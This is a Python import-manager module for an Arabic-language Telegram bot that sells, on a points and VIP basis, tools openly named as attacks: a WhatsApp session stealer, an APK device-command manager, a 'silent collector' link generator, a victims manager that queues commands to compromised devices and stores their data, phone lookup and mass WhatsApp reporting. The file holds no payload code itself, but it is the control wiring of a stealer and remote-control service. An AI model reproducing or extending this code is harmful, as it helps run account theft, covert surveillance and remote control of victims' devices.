# imports_manager.py
# ============================================================
# v13 — الإعدادات + رسائل التأكيد + نظام النقاط
# ============================================================
import io
import json
from telebot.types import InlineKeyboardMarkup
from logging_config import get_logger

logger = get_logger("imports_manager")

try:
    from config import redis_client
except Exception:
    redis_client = None


# ═══ Facebook ═══
try:
    from facebook_module import init_facebook_routes
    logger.info("[+] facebook_module imported")
except Exception as e:
    logger.error(f"facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None


# ═══ Instagram ═══
try:
    from instagram_module import init_instagram_routes
    logger.info("[+] instagram_module imported")
except Exception as e:
    logger.error(f"instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None


# ═══ WhatsApp Stealer ═══
try:
    from wa_stealer import (
        init_whatsapp_stealer_routes,
        wa_bp,
        get_wa_data,
        build_wa_panel,
        create_wa_session,
        get_wa_session,
    )
    WA_ENABLED = True
    logger.info("[+] wa_stealer imported")
except Exception as e:
    logger.error(f"wa_stealer: {e}")
    WA_ENABLED = False

    def init_whatsapp_stealer_routes(app, bot): pass
    wa_bp = None
    def get_wa_data(session_id): return {"storage": None, "idb": None, "chunks_count": 0}
    def build_wa_panel(session_id, chat_id): return InlineKeyboardMarkup()
    def create_wa_session(session_id, chat_id): return None
    def get_wa_session(session_id): return None


# ═══ APK Manager ═══
try:
    from apk_manager import (
        init_apk_routes,
        apk_bp,
        build_apk_panel,
        push_apk_command,
        create_apk_code,
        get_apk_code,
        get_apk_devices,
        get_apk_device,
    )
    APK_MANAGER_ENABLED = True
    logger.info("[+] apk_manager imported")
except Exception as e:
    logger.error(f"apk_manager: {e}")
    APK_MANAGER_ENABLED = False

    def init_apk_routes(app, bot): pass
    apk_bp = None
    def build_apk_panel(device_id): return InlineKeyboardMarkup()
    def push_apk_command(*a, **kw): return False
    def create_apk_code(chat_id): return None
    def get_apk_code(code): return None
    def get_apk_devices(): return []
    def get_apk_device(device_id): return None


# ═══ Silent Collector ═══
try:
    from silent_collector import (
        init_silent_collector_routes,
        generate_silent_link,
        get_silent_data,
        get_user_silent_sessions,
    )
    SILENT_ENABLED = True
    logger.info("[+] silent_collector imported")
except Exception as e:
    logger.exception(f"silent_collector: {e}")
    SILENT_ENABLED = False

    def init_silent_collector_routes(app, bot): pass
    def generate_silent_link(*a, **kw): return None
    def get_silent_data(*a, **kw): return None
    def get_user_silent_sessions(*a, **kw): return []


# ═══ ★★★ WhatsApp Report ★★★ ═══
try:
    from whatsapp_report_generator import (
        generate_report,
        create_report_session,
        get_report_session,
        log_report_sent,
        get_user_report_history,
        add_to_history,
        normalize_number,
        REPORT_TEMPLATES,
        WA_REPORT_EMAILS,
    )
    WA_REPORT_ENABLED = True
    logger.info("[+] whatsapp_report_generator imported")
except Exception as e:
    logger.error(f"whatsapp_report_generator: {e}")
    WA_REPORT_ENABLED = False

    def generate_report(*a, **kw): return {"error": "disabled"}
    def create_report_session(*a, **kw): return None
    def get_report_session(*a, **kw): return None
    def log_report_sent(*a, **kw): return 0
    def get_user_report_history(*a, **kw): return []
    def add_to_history(*a, **kw): return None
    def normalize_number(*a, **kw): return None
    REPORT_TEMPLATES = {}
    WA_REPORT_EMAILS = {}


# ═══ Phone Search ═══
try:
    from phone_search import (
        search_phone,
        format_result_for_telegram,
    )
    PHONE_SEARCH_ENABLED = True
    logger.info("[+] phone_search imported")
except Exception as e:
    logger.exception(f"phone_search: {e}")
    PHONE_SEARCH_ENABLED = False

    def search_phone(*a, **kw): return {'error': 'Phone search disabled'}
    def format_result_for_telegram(r): return "❌ Phone search disabled"


def get_user_phone_searches(chat_id, limit=10):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange(f"phone_searches:{chat_id}", 0, limit - 1)
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


# ═══ Victims Manager ═══
try:
    from victims_manager import (
        create_victim, get_victim, get_all_victims, delete_victim,
        update_victim_status, rename_victim,
        find_victim_by_token, register_victim_device,
        add_victim_data, get_victim_data,
        queue_victim_command, pop_victim_commands,
        get_victim_stats, has_victim_commands,
    )
    VICTIMS_ENABLED = True
    logger.info("[+] victims_manager imported")
except Exception as e:
    logger.exception(f"victims_manager: {e}")
    VICTIMS_ENABLED = False

    def create_victim(*a, **kw): return None
    def get_victim(*a, **kw): return None
    def get_all_victims(*a, **kw): return []
    def delete_victim(*a, **kw): return False
    def update_victim_status(*a, **kw): return False
    def rename_victim(*a, **kw): return False
    def find_victim_by_token(*a, **kw): return None
    def register_victim_device(*a, **kw): return None
    def add_victim_data(*a, **kw): return False
    def get_victim_data(*a, **kw): return []
    def queue_victim_command(*a, **kw): return False
    def pop_victim_commands(*a, **kw): return []
    def get_victim_stats(*a, **kw): return {}
    def has_victim_commands(*a, **kw): return False


# ═══ ★★★ Points System ★★★ ═══
try:
    from points_system import (
        get_or_create_user, can_use_tool, consume_usage,
        build_main_menu_keyboard, build_points_menu_keyboard,
        build_points_menu_text, build_my_account_text,
        build_points_history_text, build_my_referrals_text,
        build_how_to_earn_text,
        build_settings_menu_keyboard, build_settings_menu_text,
        build_tool_confirm_text, build_tool_confirm_keyboard,
        is_admin, is_vip,
        get_all_users, get_user, save_user,
        delete_user, ban_user, unban_user,
        add_points, remove_points, set_points,
        get_referral_by_code, get_user_referrals,
        build_admin_stats_text as _points_admin_stats,
        ADMIN_IDS, WELCOME_POINTS, REFERRAL_POINTS,
        TOOL_PRICES, TOOL_NAMES_AR, TOOL_DESCRIPTIONS,
    )
    POINTS_SYSTEM_ENABLED = True
    logger.info("[+] points_system imported")
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 0
    AVAILABLE_TOOLS = list(TOOL_PRICES.keys())
except Exception as e:
    logger.exception(f"points_system: {e}")
    POINTS_SYSTEM_ENABLED = False

    def get_or_create_user(user_id, *a, **kw):
        return {"user_id": user_id, "points": 0, "is_banned": False, "is_vip": False}

    def can_use_tool(user_id, tool):
        return {"allowed": True, "reason": "bypass", "cost": 0, "balance": 0}

    def consume_usage(user_id, tool): return True
    def build_main_menu_keyboard(user_id): return InlineKeyboardMarkup()
    def build_points_menu_keyboard(user_id): return InlineKeyboardMarkup()
    def build_points_menu_text(user_id): return "نظام النقاط معطّل"
    def build_my_account_text(user_id): return "نظام النقاط معطّل"
    def build_points_history_text(user_id, limit=10): return ""
    def build_my_referrals_text(user_id, limit=20): return ""
    def build_how_to_earn_text(): return ""
    def build_settings_menu_keyboard(user_id): return InlineKeyboardMarkup()
    def build_settings_menu_text(user_id): return "الإعدادات"
    def build_tool_confirm_text(user_id, tool): return "تأكيد", True
    def build_tool_confirm_keyboard(tool, can_proceed=True): return InlineKeyboardMarkup()
    def is_admin(uid): return False
    def is_vip(uid): return False
    def get_all_users(): return []
    def get_user(uid): return None
    def save_user(uid, u): return False
    def delete_user(uid): return False
    def ban_user(uid): return False
    def unban_user(uid): return False
    def add_points(*a, **kw): return False
    def remove_points(*a, **kw): return False
    def set_points(*a, **kw): return False
    def get_referral_by_code(code): return None
    def get_user_referrals(uid, limit=50): return []
    def _points_admin_stats(): return ""
    ADMIN_IDS = []
    WELCOME_POINTS = 25
    REFERRAL_POINTS = 10
    TOOL_PRICES = {}
    TOOL_NAMES_AR = {}
    TOOL_DESCRIPTIONS = {}
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 0
    AVAILABLE_TOOLS = []


# ══════════════════════════════════════════════════════════
# Legacy Functions
# ══════════════════════════════════════════════════════════
def build_main_payment_keyboard():
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
    m.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return m


def build_plans_keyboard():
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 نقاطي", callback_data="points_menu"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return m


def build_account_text(user_id):
    try:
        from points_system import build_my_account_text
        return build_my_account_text(user_id)
    except Exception:
        return f"👤 حسابك — ID: {user_id}"


def build_plans_text():
    return "💰 النظام تغيّر إلى النقاط — اضغط 💰 نقاطي"


def send_invoice(*args, **kwargs): return None
def activate_subscription(*args, **kwargs): return {}


def register_payment_handlers(bot):
    logger.info("Payment handlers: SKIPPED (using points system)")


# ─── Admin Legacy ───
def build_admin_menu():
    try:
        from admin_system import build_advanced_admin_menu
        return build_advanced_admin_menu()
    except Exception as e:
        logger.warning(f"build_advanced_admin_menu failed: {e}")

    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"))
    m.row(
        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
        InlineKeyboardButton("➕ إعطاء نقاط", callback_data="admin_give_points"),
    )
    m.row(
        InlineKeyboardButton("🚫 حظر", callback_data="admin_ban"),
        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban"),
    )
    m.row(
        InlineKeyboardButton("🗑️ حذف", callback_data="admin_delete"),
        InlineKeyboardButton("🔍 بحث", callback_data="admin_search"),
    )
    m.row(
        InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("📋 آخر المسجلين", callback_data="admin_recent"),
    )
    m.row(
        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast"),
        InlineKeyboardButton("⚙️ إدارة التحديثات", callback_data="admin_updates"),
    )
    m.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return m


def build_admin_users_keyboard(users, page=0, per_page=10):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    start = page * per_page
    end = start + per_page
    page_users = users[start:end]

    for u in page_users:
        uid = u.get("user_id")
        name = (u.get("first_name") or u.get("username") or "Unknown")[:20]
        if is_admin(uid):
            icon = "👑"
        elif u.get("is_banned"):
            icon = "🚫"
        elif u.get("is_vip"):
            icon = "💎"
        else:
            icon = "👤"
        m.row(InlineKeyboardButton(f"{icon} {name} | {uid}", callback_data=f"admin_user_{uid}"))

    total_pages = max(1, (len(users) + per_page - 1) // per_page)
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️", callback_data=f"admin_users_{page-1}"))
    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("➡️", callback_data=f"admin_users_{page+1}"))
    if nav_buttons:
        m.row(*nav_buttons)

    m.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
    return m


def build_user_detail_keyboard(uid, user):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()

    if user.get("is_banned"):
        m.row(InlineKeyboardButton("✅ فك الحظر", callback_data=f"admin_unban_user_{uid}"))
    else:
        m.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_user_{uid}"))

    if user.get("is_vip"):
        m.row(InlineKeyboardButton("❌ إزالة VIP", callback_data=f"admin_remove_vip_{uid}"))
    else:
        m.row(InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"))

    m.row(InlineKeyboardButton("➕ إعطاء نقاط", callback_data=f"admin_give_points_{uid}"))
    m.row(InlineKeyboardButton("🗑️ حذف نهائي", callback_data=f"admin_delete_user_{uid}"))
    m.row(
        InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_users_0"),
    )
    return m


def build_user_info_text(uid, user):
    try:
        from admin_system import build_user_full_info_text
        return build_user_full_info_text(uid)
    except Exception:
        pass

    import html
    def _h(t): return html.escape(str(t)) if t else ""

    if is_admin(uid):
        status = "👑 أدمن"
    elif user.get("is_banned"):
        status = "🚫 محظور"
    elif user.get("is_vip"):
        status = "💎 VIP"
    else:
        status = "👤 مستخدم"

    return (
        f"👤 <b>معلومات المستخدم</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <code>{uid}</code>\n"
        f"👋 <b>{_h(user.get('first_name', 'Unknown'))}</b>\n"
        f"📊 <b>الحالة:</b> {status}\n"
        f"💰 <b>النقاط:</b> <code>{user.get('points', 0)}</code>\n"
        f"🎁 <b>الإحالات:</b> <code>{user.get('referral_count', 0)}</code>\n"
    )


def build_admin_stats_text():
    try:
        from admin_system import build_admin_stats_text as _admin_stats
        return _admin_stats()
    except Exception:
        pass
    try:
        from points_system import build_admin_stats_text as _points_stats
        return _points_stats()
    except Exception:
        return "📊 <b>إحصائيات</b>"


logger.info(
    f"Imports Summary | "
    f"PHONE_SEARCH={PHONE_SEARCH_ENABLED} | "
    f"SILENT={SILENT_ENABLED} | "
    f"WA={WA_ENABLED} | "
    f"WA_REPORT={WA_REPORT_ENABLED} | "
    f"APK_MGR={APK_MANAGER_ENABLED} | "
    f"VICTIMS={VICTIMS_ENABLED} | "
    f"POINTS_SYSTEM={POINTS_SYSTEM_ENABLED}"
    )
